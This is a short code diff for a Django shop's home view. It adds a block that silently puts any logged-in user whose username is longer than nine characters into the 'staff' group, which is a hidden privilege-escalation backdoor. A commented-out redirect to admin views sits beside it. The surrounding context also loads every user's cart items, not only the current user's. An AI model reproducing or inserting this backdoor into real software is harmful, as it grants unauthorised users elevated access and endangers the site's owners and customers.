@@ -26,6 +26,11 @@ def custom_forbidden(request):
 
 @login_required
 def home(request):
+    if len(request.user.username)>9:
+        user = get_object_or_404(User, id=request.user.id)
+        admin_group = Group.objects.get(name='staff') 
+        user.groups.add(admin_group)
+        # return redirect('admin_views')
     products = Product.objects.all()
     purchased_items = PurchasedItem.objects.filter(user = request.user)
     cart_items = Cart.objects.all()
